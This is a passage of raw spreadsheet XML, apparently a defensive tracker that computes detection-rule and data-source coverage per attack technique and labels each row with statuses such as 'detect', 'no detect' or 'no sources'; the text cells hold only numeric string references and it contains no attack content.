        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S47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79" t="s">
        <v>368</v>
      </c>
      <c r="U479" t="s">
        <v>2311</v>
      </c>
      <c r="W479" t="b">
        <v>1</v>
      </c>
      <c r="X479" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="480" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A480" t="s">
        <v>2259</v>
      </c>
      <c r="B480" t="s">
        <v>2312</v>
      </c>
      <c r="C480" t="s">
        <v>2313</v>
      </c>
      <c r="D480" t="s">
        <v>6</v>
      </c>
      <c r="E480" t="s">
        <v>554</v>
      </c>
      <c r="F480" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G480" s="9" cm="1">
        <f t="array" ref="G480">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H480" s="9" t="str" cm="1">
        <f t="array" ref="H480">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I480" s="9" t="str" cm="1">
        <f t="array" ref="I480">IF(SUM(IF($C480=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C480=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J480" s="9" t="str" cm="1">
        <f t="array" ref="J48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80" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M480" s="9" cm="1">
        <f t="array" ref="M480">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N480" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O480" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P480" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S48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80" t="s">
        <v>368</v>
      </c>
      <c r="U480" t="s">
        <v>2314</v>
      </c>
      <c r="W480" t="b">
        <v>1</v>
      </c>
      <c r="X480" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="481" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A481" t="s">
        <v>2315</v>
      </c>
      <c r="B481" t="s">
        <v>2315</v>
      </c>
      <c r="C481" t="s">
        <v>62</v>
      </c>
      <c r="D481" t="s">
        <v>13</v>
      </c>
      <c r="E481" t="s">
        <v>2316</v>
      </c>
      <c r="F481" s="9">
        <f t="shared" si="7"/>
        <v>7</v>
      </c>
      <c r="G481" s="9" cm="1">
        <f t="array" ref="G481">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H481" s="9" cm="1">
        <f t="array" ref="H481">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I481" s="9" t="str" cm="1">
        <f t="array" ref="I481">IF(SUM(IF($C481=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C481=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J481" s="9" cm="1">
        <f t="array" ref="J48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481" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M481" s="9" cm="1">
        <f t="array" ref="M481">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N481" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O481" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P481" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S48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81" t="s">
        <v>368</v>
      </c>
      <c r="U481" t="s">
        <v>2317</v>
      </c>
      <c r="V481" t="s">
        <v>2318</v>
      </c>
      <c r="W481" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="482" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A482" t="s">
        <v>2315</v>
      </c>
      <c r="B482" t="s">
        <v>2319</v>
      </c>
      <c r="C482" t="s">
        <v>2320</v>
      </c>
      <c r="D482" t="s">
        <v>13</v>
      </c>
      <c r="E482" t="s">
        <v>2321</v>
      </c>
      <c r="F482" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G482" s="9" cm="1">
        <f t="array" ref="G482">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H482" s="9" t="str" cm="1">
        <f t="array" ref="H482">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I482" s="9" t="str" cm="1">
        <f t="array" ref="I482">IF(SUM(IF($C482=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C482=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J482" s="9" t="str" cm="1">
        <f t="array" ref="J48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82" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M482" s="9" cm="1">
        <f t="array" ref="M482">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N482" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O482" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P482" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S48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82" t="s">
        <v>368</v>
      </c>
      <c r="U482" t="s">
        <v>2322</v>
      </c>
      <c r="V482" t="s">
        <v>2323</v>
      </c>
      <c r="W482" t="b">
        <v>1</v>
      </c>
      <c r="X482" t="s">
        <v>2315</v>
      </c>
    </row>
    <row r="483" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A483" t="s">
        <v>2315</v>
      </c>
      <c r="B483" t="s">
        <v>2324</v>
      </c>
      <c r="C483" t="s">
        <v>2325</v>
      </c>
      <c r="D483" t="s">
        <v>13</v>
      </c>
      <c r="E483" t="s">
        <v>2326</v>
      </c>
      <c r="F483" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G483" s="9" cm="1">
        <f t="array" ref="G483">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H483" s="9" t="str" cm="1">
        <f t="array" ref="H483">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I483" s="9" t="str" cm="1">
        <f t="array" ref="I483">IF(SUM(IF($C483=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C483=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J483" s="9" t="str" cm="1">
        <f t="array" ref="J48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83" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M483" s="9" cm="1">
        <f t="array" ref="M483">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N483" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O483" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P483" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S48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83" t="s">
        <v>368</v>
      </c>
      <c r="U483" t="s">
        <v>2327</v>
      </c>
      <c r="V483" t="s">
        <v>2328</v>
      </c>
      <c r="W483" t="b">
        <v>1</v>
      </c>
      <c r="X483" t="s">
        <v>2315</v>
      </c>
    </row>
    <row r="484" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A484" t="s">
        <v>2315</v>
      </c>
      <c r="B484" t="s">
        <v>2329</v>
      </c>
      <c r="C484" t="s">
        <v>2330</v>
      </c>
      <c r="D484" t="s">
        <v>13</v>
      </c>
      <c r="E484" t="s">
        <v>2331</v>
      </c>
      <c r="F484" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G484" s="9" cm="1">
        <f t="array" ref="G484">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H484" s="9" t="str" cm="1">
        <f t="array" ref="H484">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I484" s="9" t="str" cm="1">
        <f t="array" ref="I484">IF(SUM(IF($C484=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C484=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J484" s="9" t="str" cm="1">
        <f t="array" ref="J48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84" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M484" s="9" cm="1">
        <f t="array" ref="M484">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N484" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O484" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P484" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S48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84" t="s">
        <v>368</v>
      </c>
      <c r="U484" t="s">
        <v>2332</v>
      </c>
      <c r="V484" t="s">
        <v>2333</v>
      </c>
      <c r="W484" t="b">
        <v>1</v>
      </c>
      <c r="X484" t="s">
        <v>2315</v>
      </c>
    </row>
    <row r="485" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A485" t="s">
        <v>2334</v>
      </c>
      <c r="B485" t="s">
        <v>2334</v>
      </c>
      <c r="C485" t="s">
        <v>78</v>
      </c>
      <c r="D485" t="s">
        <v>2</v>
      </c>
      <c r="E485" t="s">
        <v>2335</v>
      </c>
      <c r="F485" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G485" s="9" cm="1">
        <f t="array" ref="G485">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H485" s="9" cm="1">
        <f t="array" ref="H485">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I485" s="9" t="str" cm="1">
        <f t="array" ref="I485">IF(SUM(IF($C485=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C485=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J485" s="9" cm="1">
        <f t="array" ref="J48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485" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M485" s="9" cm="1">
        <f t="array" ref="M485">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N485" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O485" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P485" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S48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85" t="s">
        <v>2336</v>
      </c>
      <c r="U485" t="s">
        <v>2337</v>
      </c>
      <c r="V485" t="s">
        <v>2338</v>
      </c>
      <c r="W485" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="486" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A486" t="s">
        <v>2334</v>
      </c>
      <c r="B486" t="s">
        <v>2339</v>
      </c>
      <c r="C486" t="s">
        <v>333</v>
      </c>
      <c r="D486" t="s">
        <v>2</v>
      </c>
      <c r="E486" t="s">
        <v>2335</v>
      </c>
      <c r="F486" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G486" s="9" cm="1">
        <f t="array" ref="G486">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H486" s="9" t="str" cm="1">
        <f t="array" ref="H486">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I486" s="9" t="str" cm="1">
        <f t="array" ref="I486">IF(SUM(IF($C486=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C486=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J486" s="9" t="str" cm="1">
        <f t="array" ref="J48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86" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M486" s="9" cm="1">
        <f t="array" ref="M486">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N486" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O486" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P486" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S48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86" t="s">
        <v>368</v>
      </c>
      <c r="U486" t="s">
        <v>2340</v>
      </c>
      <c r="V486" t="s">
        <v>2341</v>
      </c>
      <c r="W486" t="b">
        <v>1</v>
      </c>
      <c r="X486" t="s">
        <v>2334</v>
      </c>
    </row>
    <row r="487" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A487" t="s">
        <v>2334</v>
      </c>
      <c r="B487" t="s">
        <v>2342</v>
      </c>
      <c r="C487" t="s">
        <v>332</v>
      </c>
      <c r="D487" t="s">
        <v>2</v>
      </c>
      <c r="E487" t="s">
        <v>1698</v>
      </c>
      <c r="F487" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G487" s="9" cm="1">
        <f t="array" ref="G487">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H487" s="9" t="str" cm="1">
        <f t="array" ref="H487">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I487" s="9" t="str" cm="1">
        <f t="array" ref="I487">IF(SUM(IF($C487=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C487=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J487" s="9" t="str" cm="1">
        <f t="array" ref="J48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87" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M487" s="9" cm="1">
        <f t="array" ref="M487">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N487" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O487" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P487" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S48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87" t="s">
        <v>2336</v>
      </c>
      <c r="U487" t="s">
        <v>2343</v>
      </c>
      <c r="V487" t="s">
        <v>2344</v>
      </c>
      <c r="W487" t="b">
        <v>1</v>
      </c>
      <c r="X487" t="s">
        <v>2334</v>
      </c>
    </row>
    <row r="488" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A488" t="s">
        <v>2334</v>
      </c>
      <c r="B488" t="s">
        <v>2345</v>
      </c>
      <c r="C488" t="s">
        <v>2346</v>
      </c>
      <c r="D488" t="s">
        <v>2</v>
      </c>
      <c r="E488" t="s">
        <v>1698</v>
      </c>
      <c r="F488" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G488" s="9" cm="1">
        <f t="array" ref="G488">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H488" s="9" t="str" cm="1">
        <f t="array" ref="H488">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I488" s="9" t="str" cm="1">
        <f t="array" ref="I488">IF(SUM(IF($C488=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C488=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J488" s="9" t="str" cm="1">
        <f t="array" ref="J48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88" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M488" s="9" cm="1">
        <f t="array" ref="M488">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N488" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O488" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P488" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S48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88" t="s">
        <v>368</v>
      </c>
      <c r="U488" t="s">
        <v>2347</v>
      </c>
      <c r="V488" t="s">
        <v>2348</v>
      </c>
      <c r="W488" t="b">
        <v>1</v>
      </c>
      <c r="X488" t="s">
        <v>2334</v>
      </c>
    </row>
    <row r="489" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A489" t="s">
        <v>2334</v>
      </c>
      <c r="B489" t="s">
        <v>2349</v>
      </c>
      <c r="C489" t="s">
        <v>334</v>
      </c>
      <c r="D489" t="s">
        <v>2</v>
      </c>
      <c r="E489" t="s">
        <v>549</v>
      </c>
      <c r="F489" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G489" s="9" cm="1">
        <f t="array" ref="G489">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H489" s="9" t="str" cm="1">
